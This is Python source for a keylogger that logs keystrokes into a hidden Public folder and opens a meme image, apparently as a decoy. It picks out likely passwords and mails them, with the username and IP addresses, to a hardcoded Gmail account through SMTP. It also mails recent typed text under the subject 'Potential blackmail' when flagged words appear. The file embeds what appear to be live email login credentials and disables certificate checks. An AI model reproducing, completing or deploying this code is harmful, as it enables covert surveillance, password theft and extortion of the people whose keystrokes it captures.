# Imports
from pynput.keyboard import Key, Listener
import socket
import pathlib
from multiprocessing import Process, freeze_support
import smtplib
from json import load
from urllib.request import urlopen, Request, urlretrieve
import smtplib
import ssl
import subprocess
import sys
from PIL import Image
import os
import multiprocessing

# Key pressed
def on_press(key):
    global buffer
    global word
    donotwrite = False
    newword = False

    try:
        # Check for specific key combinations
        if key.char == ' ':
            buffer += " "
            newword = True
        elif key.char == '\b':  # Backspace
            buffer = buffer[:-1]
            word = word[:-1]
            truncate_file(file_path, buffer)
            donotwrite = True
        elif key.char == '\r':  # Enter
            buffer += "\n"
            newword = True
        elif key.char.isalnum() or key.char in ["!", "?", ",", "."]:
            buffer += key.char
            word += key.char
        else:
            #print(f"Unhandled key: {key}")
            pass
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Shift)
        if key == Key.space:
            buffer += " "
            newword = True
        elif key == Key.backspace:
            buffer = buffer[:-1]
            word = word[:-1]
            truncate_file(file_path, buffer)
            donotwrite = True
        elif key == Key.enter:
            buffer += "\n"
            newword = True
        else:
            #print(f"Unhandled key: {key}")
            pass

    if not donotwrite:
        update_file(file_path, buffer, word, newword)

    if newword:
        word = ""


# Send email
def sendMail (subject, message):
    #print ("Sending text...")
    ssl._create_default_https_context = ssl._create_unverified_context

    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    
    msg = MIMEMultipart()
    msg['From'] = '403.th3ta@gmail.com'
    msg['To'] = '403.th3ta@gmail.com'
    msg['Subject'] = subject
    msg.attach(MIMEText(message))
    server.sendmail(
      "403.th3ta@gmail.com", 
      "403.th3ta@gmail.com", 
      msg.as_string ())
    #server.quit()

# Character recognition
def Recognise (word):
    url = "http://jsonip.com"
    request_site = Request(url, headers={"User-Agent": "Mozilla/5.0"})
    ipv6 = load (urlopen (request_site))['ip']
    import getpass
    user = getpass.getuser()
    # Password classification + identification
    rules = [lambda word: any(x.islower() for x in word),  # must have at least one lowercase
        lambda word: any(x.isdigit() for x in word),  # must have at least one digit
        lambda word: len(word) >= 7                   # must be at least 7 characters
        ]
    
    if all (rule (word) for rule in rules): # If word fits criteria
        Password = word # Set password
        #print (Password)
        #p = Process(target=sendMail, args=("Potential password", str (user + '\n' + Password + '\n' + ipv6 + '\n' + IP)))
        #p.daemon = True
        #p.start()
        sendMail ("Potential password", str (user + '\n' + Password + '\n' + ipv6 + '\n' + IP))

    auxiliary = [" ", "\n", ".", "!", "ing", "?", ",", "ed"]
    with open(Path + 'bad_words.txt') as f:
        temp_word = word
        for aux in auxiliary:
            altered_word = temp_word.replace (aux, "")
            #print (altered_word)
            temp_word = altered_word
        #print (temp_word)
        f_lines = f.readlines ()
        for line in f_lines:
            line = line.strip ()
            if line in temp_word:
                with open (Path + 'O_K.txt', 'r') as h:
                    words = h.read ()
                    sendMail ("Potential blackmail", str (user + '\n' + ipv6 + '\n' + IP + '\n' + words))

    chars = ""
    with open (Path + "O_K.txt", 'r') as j:
        chars = j.read()
        num_chars = len (chars)
        if num_chars > 250:
            N = num_chars
            while N > 250:
                chars = chars.replace (chars[0], "", 1)
                N = N - 1
            pass

    with open(Path + "O_K.txt", 'w') as k:
        k.write (chars)

# Backspace
def truncate_file(file_path, buffer):
    with open(file_path, 'w') as file:
        file.write(buffer)
    with open(Path + 'O_K.txt', 'w') as file:
        file.write(buffer)

# Update
def update_file(file_path, content, word, newword):
    with open(file_path, 'w') as file:
        file.write(content)
    with open(Path + 'O_K.txt', 'w') as file:
        file.write(content)

    if newword:
        Recognise (word)

def main ():
    global file_path
    global buffer
    global word
    global Password
    global IP
    global server
    global Path

    # Variables
    Temp_Path = r"C:\Users\Public\\"
    try:
        os.mkdir (Temp_Path + "Loki")
    except:
        pass
    Path = Temp_Path + "Loki\\"
    file_path = Path + "keylog.txt"
    buffer = ""
    word = ""
    Password = "" # Suspected password
    IP = "" # IP

    # Open image
    image = Image.open (Path + "meme.jpg")
    image.show ()

    import time
    time.sleep (1)

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login("403.th3ta@gmail.com", "unosryrgbvyjrxib")

    # IP Retrieval
    s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
    s.connect (("8.8.8.8", 80))
    IP = s.getsockname()[0]
    s.close ()

    # Initialise
    with open (file_path, 'w') as k:
        k.write ('')
    with open (Path + 'O_K.txt', 'w') as ok:
        ok.write ('')
    
    with Listener(on_press=on_press) as listener:
        listener.join()
